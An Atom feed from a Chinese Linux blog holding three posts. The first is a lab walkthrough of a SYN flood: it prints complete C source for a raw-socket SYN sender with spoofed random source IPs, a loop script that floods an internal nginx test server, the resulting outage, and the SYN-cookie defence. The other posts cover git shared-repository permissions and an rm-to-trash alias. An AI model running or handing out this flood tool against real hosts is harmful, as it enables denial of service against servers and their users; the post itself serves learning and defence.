<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: linux | SK's Blog]]></title>
  <link href="http://sunkid.me/blog/categories/linux/atom.xml" rel="self"/>
  <link href="http://sunkid.me/"/>
  <updated>2014-04-09T17:13:28+08:00</updated>
  <id>http://sunkid.me/</id>
  <author>
    <name><![CDATA[sk.c]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[syn flood(syn 洪水) 攻防实战]]></title>
    <link href="http://sunkid.me/blog/2013/10/18/syn-flooddos/"/>
    <updated>2013-10-18T13:54:00+08:00</updated>
    <id>http://sunkid.me/blog/2013/10/18/syn-flooddos</id>
    <content type="html"><![CDATA[<p>说到 <code>syn洪水</code> 大家应该都不陌生。 sk.c之前听说过其中的原理，但也没真枪实弹试过。
到最近在学习服务器调优才实践尝试了下，才有了这篇烂笔头博文，有说的不对的地方，还请赐教</p>

<p>一开始，我们还是再唠叨下 syn flood doc 的原理:</p>

<h3>1.TCP三次握手</h3>

<h4><code>syn flood doc</code> 是基于TCP协议缺陷的。那么，我们先看下TCP三次握手的协议图</h4>

<p><img src="/images/post/tcp.png"></p>

<p>我们看到，tcp 在初始化连接的时候，需要经过三次握手，若某客户端发送大量<code>syn</code>请求给服务端，然后不返回<code>ack</code>包。
那么，服务端将会存在大量的syn队列(SYN_RCVD),导致占用大量服务端资源，让其他正常用户无法正常访问服务器。</p>

<!-- more -->


<p><img src="/images/post/tcp2.png"></p>

<p>sk.c 之前想过这样的方案 <strong> 我们是否可以限制相同IP的syn请求数来解决问题？</strong></p>

<p>当然，这太天真了，原因在于: <strong> 单个数据包请求的IP来源地址可以轻松的伪造！</strong></p>

<p>嗯，这时我们需要简单了解下 IP 协议</p>

<h3>2.IP 协议</h3>

<h4>IP协议中，</h4>

<p><img src="/images/post/ip.png"></p>

<p>基于<strong>每个IP数据报头都标明(32位源IP地址)</strong>这点，我们只要在构造的 syn 包中随机的填写源IP地址, 那么就可以伪造数据来源的IP啦。</p>

<p>这样的话，那是不是意味着我们在互联网通信都可以用这样简单的方式来伪造IP呢？ -- 答案是否定的，原因留给读者想想看 :)</p>

<h3>syn_act 实现</h3>

<h4>基于以上两个原理，我们可以写一个程序，用随机IP的 <code>syn</code> 去攻击一台服务器</h4>

<p>``` c syn_act
/<em>
Syn Flood DOS with LINUX sockets
</em>/</p>

<h1>include&lt;stdio.h></h1>

<h1>include&lt;string.h>        //memset</h1>

<h1>include&lt;sys/socket.h></h1>

<h1>include&lt;stdlib.h>        //for exit(0);</h1>

<h1>include&lt;errno.h>         //For errno - the error number</h1>

<h1>include&lt;netinet/tcp.h>   //Provides declarations for tcp header</h1>

<h1>include&lt;netinet/ip.h>    //Provides declarations for ip header</h1>

<h1>include&lt;sys/time.h></h1>

<p>struct pseudo_header {    //needed for checksum calculation</p>

<pre><code>    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcp;
</code></pre>

<p>};</p>

<p>unsigned short csum(unsigned short *ptr,int nbytes) {</p>

<pre><code>    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes&gt;1) {
            sum+=*ptr++;
            nbytes-=2;
    }
    if(nbytes==1) {
            oddbyte=0;
            *((u_char*)&amp;oddbyte)=*(u_char*)ptr;
            sum+=oddbyte;
    }

    sum = (sum&gt;&gt;16)+(sum &amp; 0xffff);
    sum = sum + (sum&gt;&gt;16);
    answer=(short)~sum;

    return(answer);
</code></pre>

<p>}</p>

<p>int main(int argc, char *argv[]) {</p>

<pre><code>    //Uncommend the loop if you want to flood :)
    //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32], dst_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    struct timeval tv_time;
    int ip1,ip2,ip3,ip4;

    gettimeofday(&amp;tv_time,NULL);
    srand(tv_time.tv_usec);

    if(argc != 2) {
            printf("Usage: syn_act 172.16.5.69\n");
    } else {
            sprintf(dst_ip,"%s",argv[1]);
    }

    // rand to get ip
    ip1 = rand() % 196;
    ip2 = rand() % 128;
    ip3 = rand() % 256;
    ip4 = rand() % 256;

    sprintf(source_ip,"%d.%d.%d.%d",ip1,ip2,ip3,ip4);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr(dst_ip);

    memset(datagram, 0, 4096);     /* zero out the buffer */

    //Fill in the IP Header
    iph-&gt;ihl = 5;
    iph-&gt;version = 4;
    iph-&gt;tos = 0;
    iph-&gt;tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph-&gt;id = htons(54321); //Id of this packet
    iph-&gt;frag_off = 0;
    iph-&gt;ttl = 255;
    iph-&gt;protocol = IPPROTO_TCP;
    iph-&gt;check = 0;         //Set to 0 before calculating checksum
    iph-&gt;saddr = inet_addr ( source_ip );   //Spoof the source ip address
    iph-&gt;daddr = sin.sin_addr.s_addr;

    iph-&gt;check = csum ((unsigned short *) datagram, iph-&gt;tot_len &gt;&gt; 1);

    //TCP Header
    tcph-&gt;source = htons (1234);
    tcph-&gt;dest = htons (80);
    tcph-&gt;seq = 0;
    tcph-&gt;ack_seq = 0;
    tcph-&gt;doff = 5;         /* first and only tcp segment */
    tcph-&gt;fin=0;
    tcph-&gt;syn=1;
    tcph-&gt;rst=0;
    tcph-&gt;psh=0;
    tcph-&gt;ack=0;
    tcph-&gt;urg=0;
    tcph-&gt;window = htons (5840);    /* maximum allowed window size */
    tcph-&gt;check = 0;/* if you set a checksum to zero, your kernel's IP stack
                            should fill in the correct checksum during transmission */
    tcph-&gt;urg_ptr = 0;
    //Now the IP checksum

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&amp;psh.tcp , tcph , sizeof (struct tcphdr));

    tcph-&gt;check = csum( (unsigned short*) &amp;psh , sizeof (struct pseudo_header));

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &amp;one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) &lt; 0) {
            printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
            exit(0);
    }

    //Send the packet
    if (sendto (s,          /* our socket */
                datagram,       /* the buffer containing headers and data */
                iph-&gt;tot_len,   /* total length of our datagram */
                0,              /* routing flags, normally always 0 */
                (struct sockaddr *) &amp;sin,       /* socket addr, just like in */
                sizeof (sin)) &lt; 0) {             /* a normal send() */
            printf ("error\n");
    } else {
            //Data send successfully
            printf ("Packet Send \n");
    }

    return 0;
</code></pre>

<p>}</p>

<p>```</p>

<p>注：源码是引用了<a href="http://www.binarytides.com/syn-flood-dos-attack/">这里</a>的基础上添加了随机ip和目标ip参数</p>

<p>编译&amp;运行</p>

<pre><code>gcc main.c syn_act
sudo ./syn_act 172.16.5.69
Packet Send
</code></pre>

<p>注意：</p>

<ol>
<li>这个程序需要用root权限运行</li>
<li>如果你在内网环境攻击外网的机器会失败，因为连接外网路由器会验证你的ip数据包来源，并修改你的ip数据包来源地址，以便实现路由的<a href="http://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">NAT</a>功能</li>
</ol>


<h3>实战</h3>

<p>我们用上面的程序来攻击一台内网测试机,配置如下:</p>

<pre><code>测试服务器
    cpu   : i3
    memory: 2G
    system: ubuntu 12.04
    server: nginx
    ip    : 172.16.5.69

测试客户端
    cpu   : E5200
    memory: 2G
    system: ubuntu 12.04
    ip    : 172.16.5.147
</code></pre>

<h4>服务端准备</h4>

<p>挂上 <code>watch -n "netstat -n 1 | awk '/^tcp/ {++S[\$NF]} END {for(a in S) print a, S[a]}'"</code> 查看tcp状态</p>

<pre><code>TIME_WAIT 24
ESTABLISHED 5
</code></pre>

<h4>客户端准备</h4>

<p>上面提供的程序运行一次只发送一个<code>syn</code>包，在这我们写个shell脚本来循环跑程序</p>

<p>```bash run.sh</p>

<h1>!/bin/sh</h1>

<h1>目标服务器ip地址</h1>

<p>ip="172.16.5.69"</p>

<p>while [ "1" = "1" ];
do</p>

<pre><code>sudo ./syn_act $ip
</code></pre>

<p>done</p>

<p>```</p>

<p>运行攻击</p>

<p><code>./run.sh</code></p>

<p>查看服务器的tcp状态,发现 SYN_RECV 数值很高</p>

<pre><code>SYN_RECV 1537
ESTABLISHED 6
</code></pre>

<p>在另外一台机器上 curl 请求测试服务器的nginx,显示无法连接服务器。</p>

<pre><code>$time curl http://172.16.5.69/index.html
curl: (7) couldn't connect to host

real    0m14.149s
user    0m0.004s
sys     0m0.004s
</code></pre>

<h3>服务端防御</h3>

<h4>终于说到我们做这个实验的目的了，内牛满面啊</h4>

<p>解决方案有很多，这里介绍一种方案：</p>

<p><code>syn_cookie</code>，你可以在<a href="http://www.ibm.com/developerworks/cn/linux/l-syncookie/">这里</a>学习到<code>syn_cookie</code>的工作原理。</p>

<h4>开启 <code>syn_cookie</code></h4>

<p>修改<code>/etc/sysctl.conf</code>文件，添加参数</p>

<pre><code>net.ipv4.tcp_syncookies = 1
</code></pre>

<p>运行下面命令，让配置文件生效</p>

<pre><code>sudo sysctl -p
</code></pre>

<p>运行 syn_act 攻击测试服务器,查看服务器的tcp状态,发现 SYN_RECV 数值依旧很高</p>

<pre><code>SYN_RECV 1537
ESTABLISHED 6
</code></pre>

<p>但是，这一次在另外一台机器上用 curl 请求测试服务器，nginx表示毫无鸭梨，立即就返回了结果</p>

<pre><code>$time curl http://172.16.5.69/index.html
hello

real    0m0.082s
user    0m0.004s
sys     0m0.003s
</code></pre>

<p>注：<code>syn_cookie</code> 在大部分linux系统下默认是开启的，你可以通过 <code>sysclt -a|grep tcp_syncookies</code> 查看下是否已经开启 :)</p>

<p>总结: <code>syn flood doc</code> 是比较老的攻击手段，目前已经有很多很好的解决方案提供支持，
甚至大部分linux系统默认设置就能抵挡一定量的攻击,小伙伴们尽可放心的使用你们的linux服务器把 :)</p>

<p>最后，把上面的代码打包下, 方便做实验的小伙伴们，点击<a href="/download/syn_act.zip">这里</a>就可以下载到哦。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GIT SSH的权限问题]]></title>
    <link href="http://sunkid.me/blog/2012/11/06/permission-for-git-ssh/"/>
    <updated>2012-11-06T14:09:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/11/06/permission-for-git-ssh</id>
    <content type="html"><![CDATA[<p>公司内部服务器部署git的话，通常会采用ssh的连接方式，部署方便，控制也容易。</p>

<p>今天，我们说说用ssh要注意的用户权限设置问题。</p>

<p>我们先建立一个ios组
<code>
groupadd ios
</code></p>

<p>给每个ios的工程师创建用户
<code>
useradd -g ios -G ios username
</code></p>

<p>创建你的git仓库
<code>
git init --bare --shared
</code></p>

<p>这里的--shared参数非常重要，它表示git文件的组用户有可写权限。
楼主就有次忘记了加这个参数，结果导致工程师A提交的文件，工程师B
可以查看到但无法修改提交。</p>

<p>当然，如果你已经创建好git仓库后发现忘记加 --shared 参数。
你也可以直接修改config文件,在core下添加这一句</p>

<p>```
[core]</p>

<pre><code>sharedrepository = 1
</code></pre>

<p>```</p>

<p>git的配置是不是也很简单呢 XD</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[linux下的回收站]]></title>
    <link href="http://sunkid.me/blog/2012/05/27/linux-trash/"/>
    <updated>2012-05-27T18:48:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/05/27/linux-trash</id>
    <content type="html"><![CDATA[<p>linux 下的rm是非常邪恶的命令，我就曾经因为一条失误的rm命令，把我近一个月的代码给删了
（那时候还没用svn，git这些工具），还好后来花了2天找回大部分代码，不然真的心都碎了。</p>

<p>有了那次教训后，每次使用rm都会小心翼翼，担心稍微有误又悲催了。。于是后来就有了给linux创
建个回收站的想法。</p>

<p>在linux下创建个独有的回收站是很简单的，只要打开文件（~/.bash_profile）,添加以下这几行命令就可以了</p>

<p>```bash .bash_profile
alias del=trash
alias dell="ls ~/.trash"</p>

<p>trash(){</p>

<pre><code>    mv $@ ~/.trash/
</code></pre>

<p>}
```</p>

<p>以后呢，如果你想删除文件，就可以用del命令了，如下：</p>

<p><code>bash
del xxx //删除xxx文件/文件夹
</code></p>

<p>你还可以通过dell命令来查看回收站里面的内容。
```bash</p>

<h2>dell</h2>

<p>xxx
```</p>

<p><strong><em>最后注意： 修改.bash_profile 文件后，需要重新登陆bash才会生效。</em></strong></p>
]]></content>
  </entry>
  
</feed>
